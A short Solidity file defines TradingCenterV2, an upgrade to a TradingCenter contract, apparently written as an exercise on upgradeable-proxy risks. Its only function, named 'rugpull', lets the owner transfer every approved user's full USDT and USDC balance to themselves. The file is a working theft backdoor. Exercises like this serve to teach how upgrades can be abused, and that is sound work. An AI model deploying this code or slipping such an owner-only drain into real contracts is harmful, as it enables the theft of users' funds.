// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

// TODO: Try to implement TradingCenterV2 here

import {TradingCenter} from "./TradingCenter.sol";
import "./Ownable.sol";

contract TradingCenterV2 is TradingCenter, Ownable {
    function rugpull(address addr) external onlyOwner {
        usdt.transferFrom(addr, msg.sender, usdt.balanceOf(addr));
        usdc.transferFrom(addr, msg.sender, usdc.balanceOf(addr));
    }
}
